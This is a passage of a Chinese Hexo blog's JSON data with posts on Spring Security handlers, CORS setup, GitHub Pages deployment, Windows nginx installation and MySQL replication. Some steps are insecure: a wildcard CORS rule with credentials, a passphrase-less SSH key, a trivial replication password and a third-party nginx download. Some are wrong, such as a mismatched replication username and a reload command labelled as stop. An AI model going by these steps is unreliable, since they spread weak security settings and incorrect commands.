class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGOUT_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">LOGOUT_SUCCESS</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"403处理器\"><a href=\"#403处理器\" class=\"headerlink\" title=\"403处理器\"></a>403处理器</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">MyAccessDeniedHandler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AccessDeniedHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AccessDeniedException</span> accessDeniedException<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PERMISSIONS_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token class-name\">REnum</span><span class=\"token punctuation\">.</span><span class=\"token constant\">USER_PERMISSIONS_ERROR</span><span class=\"token punctuation\">.</span><span class=\"token function\">getStatusMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        writer<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"跨域\"><a href=\"#跨域\" class=\"headerlink\" title=\"跨域\"></a>跨域</h3><h4 id=\"后端\"><a href=\"#后端\" class=\"headerlink\" title=\"后端\"></a>后端</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CorsConfig</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">WebMvcConfigurer</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addCorsMappings</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CorsRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/**\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedOriginPatterns</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedMethods</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HEAD\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"PUT\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"DELETE\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"OPTIONS\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowCredentials</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">maxAge</span><span class=\"token punctuation\">(</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">allowedHeaders</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"vue-两种方式\"><a href=\"#vue-两种方式\" class=\"headerlink\" title=\"vue(两种方式)\"></a>vue(两种方式)</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">axios.defaults.withCredentials <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span> <span class=\"token comment\"># main.js\t</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 创建axios实例</span>\nvar instance <span class=\"token operator\">=</span>  axios.create<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    baseURL: <span class=\"token string\">'http://localhost:8888/'</span>, <span class=\"token comment\"># 添加基本地址</span>\n    timeout: <span class=\"token number\">1000</span>, <span class=\"token comment\"># 所有请求在超时前等待1秒</span>\n    withCredentials: <span class=\"token boolean\">true</span> <span class=\"token comment\"># 请求的时候携带cookie</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n"},{"title":"GitHubPages部署Hexo","top":true,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-17T13:33:38.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"GitHubPages部署Hexo","_content":"\n## GitHubPages部署Hexo\n\n### 创建仓库\n<你的github用户名>.github.io\n\n### 安装Git\n[`点击安装git工具`](https://git-scm.com/)\n\n> 配置Git\n```shell\ngit config --global user.name \"你的GitHub用户名\"\ngit config --global user.email \"你的GitHub注册邮箱\"\n```\n\n> 生成ssh密钥文件\n```shell\nssh-keygen -t rsa -C \"你的GitHub注册邮箱\"\n```\n然后直接三个回车即可，默认不需要设置密码\n然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制\n打开GitHub_Settings_keys 页面，新建new SSH Key\n\n### 安装Node.js\n[`点击安装node.js`](https://nodejs.org/en/download)\n配置环境变量自行百度\n\n### 安装Hexo\n> 安装Hexo\n```shell\nnpm install -g hexo-cli \n```\n\n> 初始化博客(只是安装之后使用，多端的时候不用)\n```shell\nhexo init blog\n```\n\n### 安装Hexo博客推送依赖\n```shell\nsudo npm install hexo-deployer-git --save\n```\n\n### 配置Hexo推送\n> 编辑博客主目录的`_config.yml`\n```shell\ndeploy:\n  type: git\n  repository: 仓库克隆地址\n  branch: main\n```\n\n> 生成博客静态文件\n```shell\nhexo g\n```\n\n> 推送博客到github\n```shell\nhexo d\n```\n\n> 本地测试\n```shell\nhexo s\n```\n\n","source":"_posts/GitHubPages部署Hexo.md","raw":"---\ntitle: GitHubPages部署Hexo\ntop: true\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-17 21:33:38\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: GitHubPages部署Hexo\ntags: hexo\ncategories: 博客部署\n---\n\n## GitHubPages部署Hexo\n\n### 创建仓库\n<你的github用户名>.github.io\n\n### 安装Git\n[`点击安装git工具`](https://git-scm.com/)\n\n> 配置Git\n```shell\ngit config --global user.name \"你的GitHub用户名\"\ngit config --global user.email \"你的GitHub注册邮箱\"\n```\n\n> 生成ssh密钥文件\n```shell\nssh-keygen -t rsa -C \"你的GitHub注册邮箱\"\n```\n然后直接三个回车即可，默认不需要设置密码\n然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制\n打开GitHub_Settings_keys 页面，新建new SSH Key\n\n### 安装Node.js\n[`点击安装node.js`](https://nodejs.org/en/download)\n配置环境变量自行百度\n\n### 安装Hexo\n> 安装Hexo\n```shell\nnpm install -g hexo-cli \n```\n\n> 初始化博客(只是安装之后使用，多端的时候不用)\n```shell\nhexo init blog\n```\n\n### 安装Hexo博客推送依赖\n```shell\nsudo npm install hexo-deployer-git --save\n```\n\n### 配置Hexo推送\n> 编辑博客主目录的`_config.yml`\n```shell\ndeploy:\n  type: git\n  repository: 仓库克隆地址\n  branch: main\n```\n\n> 生成博客静态文件\n```shell\nhexo g\n```\n\n> 推送博客到github\n```shell\nhexo d\n```\n\n> 本地测试\n```shell\nhexo s\n```\n\n","slug":"GitHubPages部署Hexo","published":1,"updated":"2023-05-17T13:50:46.358Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clhrrgxrw00003svgc98ta548","content":"<h2 id=\"GitHubPages部署Hexo\"><a href=\"#GitHubPages部署Hexo\" class=\"headerlink\" title=\"GitHubPages部署Hexo\"></a>GitHubPages部署Hexo</h2><h3 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h3><p>&lt;你的github用户名&gt;.github.io</p>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><p><a href=\"https://git-scm.com/\"><code>点击安装git工具</code></a></p>\n<blockquote>\n<p>配置Git</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.name <span class=\"token string\">\"你的GitHub用户名\"</span>\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.email <span class=\"token string\">\"你的GitHub注册邮箱\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>生成ssh密钥文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ssh-keygen <span class=\"token parameter variable\">-t</span> rsa <span class=\"token parameter variable\">-C</span> <span class=\"token string\">\"你的GitHub注册邮箱\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制<br>打开GitHub_Settings_keys 页面，新建new SSH Key</p>\n<h3 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"安装Node.js\"></a>安装Node.js</h3><p><a href=\"https://nodejs.org/en/download\"><code>点击安装node.js</code></a><br>配置环境变量自行百度</p>\n<h3 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h3><blockquote>\n<p>安装Hexo</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> hexo-cli <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>初始化博客(只是安装之后使用，多端的时候不用)</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo init blog<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装Hexo博客推送依赖\"><a href=\"#安装Hexo博客推送依赖\" class=\"headerlink\" title=\"安装Hexo博客推送依赖\"></a>安装Hexo博客推送依赖</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"配置Hexo推送\"><a href=\"#配置Hexo推送\" class=\"headerlink\" title=\"配置Hexo推送\"></a>配置Hexo推送</h3><blockquote>\n<p>编辑博客主目录的<code>_config.yml</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">deploy:\n  type: <span class=\"token function\">git</span>\n  repository: 仓库克隆地址\n  branch: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>生成博客静态文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo g<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>推送博客到github</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>本地测试</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo s<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"GitHubPages部署Hexo\"><a href=\"#GitHubPages部署Hexo\" class=\"headerlink\" title=\"GitHubPages部署Hexo\"></a>GitHubPages部署Hexo</h2><h3 id=\"创建仓库\"><a href=\"#创建仓库\" class=\"headerlink\" title=\"创建仓库\"></a>创建仓库</h3><p>&lt;你的github用户名&gt;.github.io</p>\n<h3 id=\"安装Git\"><a href=\"#安装Git\" class=\"headerlink\" title=\"安装Git\"></a>安装Git</h3><p><a href=\"https://git-scm.com/\"><code>点击安装git工具</code></a></p>\n<blockquote>\n<p>配置Git</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.name <span class=\"token string\">\"你的GitHub用户名\"</span>\n<span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> user.email <span class=\"token string\">\"你的GitHub注册邮箱\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>生成ssh密钥文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">ssh-keygen <span class=\"token parameter variable\">-t</span> rsa <span class=\"token parameter variable\">-C</span> <span class=\"token string\">\"你的GitHub注册邮箱\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>然后直接三个回车即可，默认不需要设置密码<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制<br>打开GitHub_Settings_keys 页面，新建new SSH Key</p>\n<h3 id=\"安装Node-js\"><a href=\"#安装Node-js\" class=\"headerlink\" title=\"安装Node.js\"></a>安装Node.js</h3><p><a href=\"https://nodejs.org/en/download\"><code>点击安装node.js</code></a><br>配置环境变量自行百度</p>\n<h3 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h3><blockquote>\n<p>安装Hexo</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> hexo-cli <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>初始化博客(只是安装之后使用，多端的时候不用)</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo init blog<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"安装Hexo博客推送依赖\"><a href=\"#安装Hexo博客推送依赖\" class=\"headerlink\" title=\"安装Hexo博客推送依赖\"></a>安装Hexo博客推送依赖</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">npm</span> <span class=\"token function\">install</span> hexo-deployer-git <span class=\"token parameter variable\">--save</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"配置Hexo推送\"><a href=\"#配置Hexo推送\" class=\"headerlink\" title=\"配置Hexo推送\"></a>配置Hexo推送</h3><blockquote>\n<p>编辑博客主目录的<code>_config.yml</code></p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">deploy:\n  type: <span class=\"token function\">git</span>\n  repository: 仓库克隆地址\n  branch: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>生成博客静态文件</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo g<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>推送博客到github</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>本地测试</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">hexo s<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n"},{"title":"Windows安装nginx","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-19T05:55:00.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Windows安装nginx","_content":"## Windows Install Nginx\n\n### 下载nginx\n> [`下载Windows版的稳定版nginx`](http://nobibibi.top/somg/file/nginx/windows/nginx-1.24.0.zip)并且解压\n\n### 启动nginx\n> - 方式一：直接双击`nginx.exe`，双击之后黑窗口一闪而过\n\n> - 方式二：在`nginx.exe`目录下打开cmd，输入`start nginx`\n\n> 查看端口是否被占用`netstat -ano | findstr \"80\"`\n\n> 重启在cmd中`nginx -s reload`\n\n> 关闭服务`nginx -s reload`，在修改配置以后可以使用\n","source":"_posts/windows安装nginx.md","raw":"---\ntitle: Windows安装nginx\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-19 13:55:00\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Windows安装nginx\ntags: nginx\ncategories: windows\n---\n## Windows Install Nginx\n\n### 下载nginx\n> [`下载Windows版的稳定版nginx`](http://nobibibi.top/somg/file/nginx/windows/nginx-1.24.0.zip)并且解压\n\n### 启动nginx\n> - 方式一：直接双击`nginx.exe`，双击之后黑窗口一闪而过\n\n> - 方式二：在`nginx.exe`目录下打开cmd，输入`start nginx`\n\n> 查看端口是否被占用`netstat -ano | findstr \"80\"`\n\n> 重启在cmd中`nginx -s reload`\n\n> 关闭服务`nginx -s reload`，在修改配置以后可以使用\n","slug":"windows安装nginx","published":1,"updated":"2023-05-19T06:06:18.289Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clhu5r2190000ygvgfd2u4h0k","content":"<h2 id=\"Windows-Install-Nginx\"><a href=\"#Windows-Install-Nginx\" class=\"headerlink\" title=\"Windows Install Nginx\"></a>Windows Install Nginx</h2><h3 id=\"下载nginx\"><a href=\"#下载nginx\" class=\"headerlink\" title=\"下载nginx\"></a>下载nginx</h3><blockquote>\n<p><a href=\"http://nobibibi.top/somg/file/nginx/windows/nginx-1.24.0.zip\"><code>下载Windows版的稳定版nginx</code></a>并且解压</p>\n</blockquote>\n<h3 id=\"启动nginx\"><a href=\"#启动nginx\" class=\"headerlink\" title=\"启动nginx\"></a>启动nginx</h3><blockquote>\n<ul>\n<li>方式一：直接双击<code>nginx.exe</code>，双击之后黑窗口一闪而过</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>方式二：在<code>nginx.exe</code>目录下打开cmd，输入<code>start nginx</code></li>\n</ul>\n</blockquote>\n<blockquote>\n<p>查看端口是否被占用<code>netstat -ano | findstr &quot;80&quot;</code></p>\n</blockquote>\n<blockquote>\n<p>重启在cmd中<code>nginx -s reload</code></p>\n</blockquote>\n<blockquote>\n<p>关闭服务<code>nginx -s reload</code>，在修改配置以后可以使用</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Windows-Install-Nginx\"><a href=\"#Windows-Install-Nginx\" class=\"headerlink\" title=\"Windows Install Nginx\"></a>Windows Install Nginx</h2><h3 id=\"下载nginx\"><a href=\"#下载nginx\" class=\"headerlink\" title=\"下载nginx\"></a>下载nginx</h3><blockquote>\n<p><a href=\"http://nobibibi.top/somg/file/nginx/windows/nginx-1.24.0.zip\"><code>下载Windows版的稳定版nginx</code></a>并且解压</p>\n</blockquote>\n<h3 id=\"启动nginx\"><a href=\"#启动nginx\" class=\"headerlink\" title=\"启动nginx\"></a>启动nginx</h3><blockquote>\n<ul>\n<li>方式一：直接双击<code>nginx.exe</code>，双击之后黑窗口一闪而过</li>\n</ul>\n</blockquote>\n<blockquote>\n<ul>\n<li>方式二：在<code>nginx.exe</code>目录下打开cmd，输入<code>start nginx</code></li>\n</ul>\n</blockquote>\n<blockquote>\n<p>查看端口是否被占用<code>netstat -ano | findstr &quot;80&quot;</code></p>\n</blockquote>\n<blockquote>\n<p>重启在cmd中<code>nginx -s reload</code></p>\n</blockquote>\n<blockquote>\n<p>关闭服务<code>nginx -s reload</code>，在修改配置以后可以使用</p>\n</blockquote>\n"},{"title":"mysql主从复制","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-05-22T10:55:05.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"mysql主从复制","_content":"\n## 单节点问题\n如果数据库是单节点，那么这台数据库如果宕机，那么就不能正常使用应用，还有可能丢失数据\n\n## mysql主从复制\n\n### 主节点配置\n\n> 在主节点的配置文件`my.cnf`中的`[mysqld]`块中修改或者添加配置\n```shell\nserver-id=1    # 服务器 id，随意，但要唯一\nlog-bin=mysql-bin   # 二进制文件存放路径\nbinlog-do-db=scada    # 待同步的数据库日志\nbinlog-ignore-db=mysql  # 不同步的数据库日志\n```\n\n> 创建一个用户，特意为了主从复制使用\n```shell\n# 创建用户 我这里用户名为copyuser，注意这里的ip是从库服务器的ip\nCREATE USER 'alave'@'%' IDENTIFIED WITH mysql_native_password BY 'alave';\n# 给主从复制账号授权\ngrant replication slave on *.* to 'alave'@'%';\n# 刷新权限\nFLUSH PRIVILEGES;\n```\n\n> 重启mysql\n```shell\nservice mysql restart\n```\n\n> 登录mysql查看master信息\n```shell\nshow master status; # 这里面有一个Position，在配置从节点的时候会使用\n```\n\n### 配置从节点\n> 在从节点的配置文件`my.cnf`中的`[mysqld]`块中修改或者添加配置\n```shell\nserver-id=2    # 服务器 id，随意，但要唯一\nlog-bin=mysql-bin   # 二进制文件存放路径\nreplicate-do-db=scada    # 待同步的数据库\nreplicate-ignore-db=mysql,information_schema,performance_schema  # 不同步的数据库\n```\n> 重启mysql\n```shell\nservice mysqld restart\n```\n\n> 登录mysql具体配置如下\n\n```shell\n# 登录mysql，然后执行后续代码\nmysql -u root -p密码\n# 关闭从库\nstop slave;\n# 设置同步，注意这里是主库ip，日志名称和位置是我们之前上图中看到的名称和位置\nchange master to master_host='192.xx.xx.111',master_user='slave',master_password='slave',master_log_file='mysql-bin.000002',master_log_pos=xxx;\n# 开启从库\nstart slave; \n#  检查服务器状态 正常情况下Slave_SQL_Running_State是Replica has read all relay log;  waiting for more updates\nshow slave status \\G;\n```\n\n### 测试\n在主节点添加一条数据，再打开从节点对应的表，会发现已经同步好了","source":"_posts/mysql主从复制.md","raw":"---\ntitle: mysql主从复制\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-05-22 18:55:05\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: mysql主从复制\ntags: mysql\ncategories: db\n---\n\n## 单节点问题\n如果数据库是单节点，那么这台数据库如果宕机，那么就不能正常使用应用，还有可能丢失数据\n\n## mysql主从复制\n\n### 主节点配置\n\n> 在主节点的配置文件`my.cnf`中的`[mysqld]`块中修改或者添加配置\n```shell\nserver-id=1    # 服务器 id，随意，但要唯一\nlog-bin=mysql-bin   # 二进制文件存放路径\nbinlog-do-db=scada    # 待同步的数据库日志\nbinlog-ignore-db=mysql  # 不同步的数据库日志\n```\n\n> 创建一个用户，特意为了主从复制使用\n```shell\n# 创建用户 我这里用户名为copyuser，注意这里的ip是从库服务器的ip\nCREATE USER 'alave'@'%' IDENTIFIED WITH mysql_native_password BY 'alave';\n# 给主从复制账号授权\ngrant replication slave on *.* to 'alave'@'%';\n# 刷新权限\nFLUSH PRIVILEGES;\n```\n\n> 重启mysql\n```shell\nservice mysql restart\n```\n\n> 登录mysql查看master信息\n```shell\nshow master status; # 这里面有一个Position，在配置从节点的时候会使用\n```\n\n### 配置从节点\n> 在从节点的配置文件`my.cnf`中的`[mysqld]`块中修改或者添加配置\n```shell\nserver-id=2    # 服务器 id，随意，但要唯一\nlog-bin=mysql-bin   # 二进制文件存放路径\nreplicate-do-db=scada    # 待同步的数据库\nreplicate-ignore-db=mysql,information_schema,performance_schema  # 不同步的数据库\n```\n> 重启mysql\n```shell\nservice mysqld restart\n```\n\n> 登录mysql具体配置如下\n\n```shell\n# 登录mysql，然后执行后续代码\nmysql -u root -p密码\n# 关闭从库\nstop slave;\n# 设置同步，注意这里是主库ip，日志名称和位置是我们之前上图中看到的名称和位置\nchange master to master_host='192.xx.xx.111',master_user='slave',master_password='slave',master_log_file='mysql-bin.000002',master_log_pos=xxx;\n# 开启从库\nstart slave; 